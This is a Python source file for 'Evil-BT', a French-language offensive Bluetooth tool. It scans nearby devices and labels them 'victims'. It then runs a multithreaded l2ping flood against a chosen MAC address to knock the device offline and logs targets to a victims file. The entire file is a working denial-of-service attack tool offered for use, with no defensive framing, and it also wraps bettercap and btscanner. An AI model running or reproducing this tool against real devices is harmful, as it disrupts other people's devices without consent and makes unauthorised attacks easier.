#!/usr/bin/python

from bluetooth import *
import os
import subprocess
from colorama import *
import sys
import argparse
import threading
import time
import string
from tqdm import tqdm
from datetime import datetime
import sys

sys.path.append('/opt/evil-bt')
import evilbt_class
from evilbt_class import *

os.system('/etc/init.d/bluetooth start')
os.system('hciconfig hci0 up')
os.system('clear')


def choose():
    print(Fore.WHITE+"[0] BT_GRAPHIC_INTERFACE\n[1] BT_COMMAND_LINE\n[2] BT_EXIT\n")
    
    q = input(Fore.CYAN+"[~]"+Fore.WHITE+" Select a number "+Fore.CYAN+"# ")
    if q == "0":
        clear_logo()
        os.system('cd /opt/evil-bt/server && /usr/bin/python3 create_server.py')
    elif q == "1":
        clear_logo()
        select()
    elif q == "2":
        os.system('exit')
    else:
        clear_logo()
        choose()

def select():
    print(Fore.WHITE+"[0] BT_add_MAC\n[1] BT_Scan\n[3] BT_Info\n[4] BT_Btscanner\n[5] BT_Bettercap\n[6] BT_Exit")
    print("")

    try:
        q = input(Fore.CYAN+"[~]"+Fore.WHITE+" Select a number "+Fore.CYAN+"# ")
        if q == "0":
            clear_logo()
            target_addr = input(Fore.CYAN+"[~]"+Fore.WHITE+" Target add mac "+Fore.CYAN+"# ")
            print(Fore.GREEN+"")
            hack(target_addr)
        elif q == "1":
            clear_logo()
            scan()
        elif q == "3":
            clear_logo()
            os.system('hciconfig')
            time.sleep(3)
            print("")
            select()
        elif q == "4":
            os.system('btscanner')
        elif q == "6":
            os.system('exit')
        elif q == "5":
            os.system('bettercap -iface wlan0 ')
        else:
            clear_logo()
            select()
    except:
        print(Fore.RED+"[X]"+Fore.WHITE+' ERREUR ! : Sélectionner un nombre',Fore.CYAN+"# ")
        select()
    
def clear_logo():
        os.system('clear')
        printLogo2()

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)



def printLogo():
    print('\x1b[37;36m')
    print('')
    print(Fore.RED+'''
                              '....xxxxx...,'. '   
                           ..XXXXXXXXXXXXXXXXXXXXx.    
                        ..XXXXXXXXWWWWWWWWWWWWWWWWXXXX.  
                   ...XXXXXWWW"   W88N88@888888WWWWWXX.   
                 ...XXXXXXWWW"    M88N88GGGGGG888^8M "WMBX.    
               ..XXXXXXXXWWW"     M88888WWRWWWMW8oo88M   WWMX.    
           "XXXXXXXXXXXXWW"       WN8888WWWWW  W8@@@8M    BMBRX.        
          XXXXXXXX=MMWW":  .      W8N888WWWWWWWW88888W      XRBRXX.  
           ""XXXXXMM::::. .        W8@889WWWWWM8@8N8W      . . :RRXx.    
                   MMM::.:.  .      W888N89999888@8W      . . ::::"RXV    
                      MMMm::.  .      WW888N88888WW     .  . mmMMMMMRXx
                       ""MMmm .  .       WWWWWWW   . :. :,miMM"""  
                              ""MMMMmm . .  .  .   ._,mMMMM""" 
                                  ""MMMMMMMMMMMMM""" 

    ''')
    print('\x1b[0m')

def printLogo2():
    print('\x1b[37;36m')
    print(Fore.CYAN+'''   
    ███████╗██╗   ██╗██╗██╗                   ██████╗ ████████╗    ██████╗    ██████╗ 
    ██╔════╝██║   ██║██║██║                   ██╔══██╗╚══██╔══╝    ╚════██╗   ╚════██╗
    █████╗  ██║   ██║██║██║         █████╗    ██████╔╝   ██║        █████╔╝    █████╔╝
    ██╔══╝  ╚██╗ ██╔╝██║██║         ╚════╝    ██╔══██╗   ██║       ██╔═══╝    ██╔═══╝ 
    ███████╗ ╚████╔╝ ██║███████╗              ██████╔╝   ██║       ███████╗██╗███████╗
    ╚══════╝  ╚═══╝  ╚═╝╚══════╝              ╚═════╝    ╚═╝       ╚══════╝╚═╝╚══════╝''')
    print("                        "+Fore.WHITE+Back.CYAN+"...:: Coded by WarHawk && Caltus124 ::...")
    print('\x1b[0m')
    print()

def scan():

    global nombre_nearby_devices
    global count
    global lists_name
    global lists_name
    global lists_addr

    print(Fore.GREEN+"")
    print("")
    print(Fore.CYAN+"Scan en cours...")

    
    nearby_devices = discover_devices(lookup_names = True)
    nombre_nearby_devices = len(nearby_devices)
    if nombre_nearby_devices == 0:
        os.system('clear')
        printLogo2()
        no_host()
    else:
        if nombre_nearby_devices >= 1:
            victimes = "victime !"
        else:
            victimes = "victimes !"  

        print(Fore.CYAN+"[~]"+Fore.WHITE+" Il y'a %d " % (nombre_nearby_devices) + victimes)

        count = 0
        lists_allname = []

        print(Fore.CYAN+"------------------------------------------------------")
        
        lists_name = []
        lists_addr = []
        for name, addr, in nearby_devices:
            count = count + 1        
            
            print(Fore.CYAN+"[" + str(count) + "]","%s - %s" % (Fore.BLUE+name, Fore.CYAN+addr),Fore.CYAN)

            lists_name.append(name) 
            lists_addr.append(addr)

        print("------------------------------------------------------")
        newscan()


def no_host():
    n = input(Fore.RED+"[!]"+Fore.WHITE+" Pas de victimes à l'horizon ! voulez-vous faire un nouveau scan ? (Y/n) "+Fore.CYAN+"# ")
    if n == "n":
        os.system('clear')
        printLogo2()
        select()
    else:
        scan()
    

def newscan():
    x = input(Fore.CYAN+"[~]"+Fore.WHITE+" Voulez-vous faire un nouveau scan ? (y/N) "+Fore.CYAN+"# ")
    if x == 'y':
    	scan()
    else:
        selection()


def selection():
    try:
        print(Fore.GREEN+"")
        n = int(input(Fore.CYAN+"[~]"+Fore.WHITE+" Sélectionner l'ID de l'adresse MAC "+Fore.CYAN+"# "))
        n = n - 1
        count_id = "["+str(n+1)+"]"

        global data_addr
        global data_name

        data_addr = lists_name[n]
        data_name = lists_addr[n]

        print(Fore.CYAN+count_id,Fore.BLUE+lists_name[n],Fore.CYAN+lists_addr[n],Fore.WHITE+"")
        z = input(Fore.CYAN+"[~]"+Fore.WHITE+" Voulez-vous confirmer ? Y/n : ")
        if z == 'n':
            selection()
        else:
            target_addr = lists_name[n]
            menu_hack(target_addr)
    except:
        print(Fore.RED+"[!]"+Fore.WHITE+" ERREUR ! : Sélectionner l'ID de l'adresse MAC "+Fore.CYAN+"# ")
        selection()            


def menu_hack(target_addr):
    os.system('clear')
    printLogo2()
    print(Fore.WHITE+"[0] BT_Info of",target_addr+"\n[1] BT_DOS of",target_addr+"\n[2] BT_Exit\n")
    q = input(Fore.CYAN+"[~]"+Fore.WHITE+" Select a number "+Fore.CYAN+"# ")
    if q == "0":
        bt_info(target_addr)
    elif q == "1":
        hack(target_addr)
    elif q == "2":
        os.system('exit'),Fore.CYAN+""

def bt_info(strings):
    os.system('clear')
    printLogo2()

    datainfo = os.system("hcitool info %s" % (strings))

    Evil_database.insert(data_addr,data_name,datainfo)


    print("")
    print(Fore.WHITE+"[0] BT_DOS of",strings+"\n[1] BT_Exit\n")
    p = input(Fore.CYAN+"[~]"+Fore.WHITE+" Select a number "+Fore.CYAN+"# ")
    if p == "0":
        hack(strings)
    elif p == "1":
        os.system('exit')

def hack(target_addr):

    if len(target_addr) < 1:
        print(Fore.RED+"[!]"+Fore.WHITE+' ERREUR ! : Adresse du materiel bluetooth manquante !'+Fore.CYAN+"# ")
        select()

    try:
        packages_size = int(input(Fore.CYAN+"[~]"+Fore.WHITE+" Tailles des paquets pour "+Fore.WHITE+target_addr+Fore.CYAN+" # "))
        if packages_size == "":
            print("600 ok")
    except:
        print(Fore.RED+"[!]"+Fore.WHITE+' ERREUR ! : La taille du paquet doit etre un integrer',Fore.CYAN+"")
        selection()
    try:
        threads_count = int(input(Fore.CYAN+"[~]"+Fore.WHITE+' Nombres de thread pour '+Fore.WHITE+target_addr+Fore.CYAN+" # "))
    except:
        print(Fore.RED+"[!]"+Fore.WHITE+' ERREUR ! : Le nombre de threads doit etre un integrer',Fore.GREEN+"")
        selection()
        print('')
        os.system('clear')

        print("\x1b[31m[*] Debut de la deconnexion dans 3...")

    for i in tqdm (range (100), desc="[*]", ascii=False, ncols=80):
        time.sleep(0.1)
        os.system('clear')
        print('[*] Creation des threads...\n')

    else:
        print(Fore.WHITE)
        os.system('figlet UwU !')
        print(Fore.GREEN)
        time.sleep(2)
        os.system('clear')

    bt_dos(threads_count, target_addr, packages_size)   
    exit(0)    

def log(mac, name):   
    f = open("/opt/evil-bt/log/victimes.log","a")
    f.write("\n"+mac + " | " + name)
    f.close()
    print(Fore.CYAN+"[~]"+Fore.WHITE+" Logs sauvegardées !")
    print("")

def bt_dos(threads_count, target_addr, packages_size):
    for i in range(0, threads_count):
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    time.sleep(3)
    print(Fore.WHITE+"L'adresse MAC "+Fore.CYAN+target_addr+Fore.WHITE+" et DOWN !")
    n = input(Fore.WHITE+"Voulez-vous recommencer ? Y/n "+Fore.CYAN+"# ")
    if n == 'y':
        select()
    else:
        pass

if __name__ == '__main__':
    printLogo()
    time.sleep(1.5)
    os.system('clear')   
    printLogo2()
    choose()
    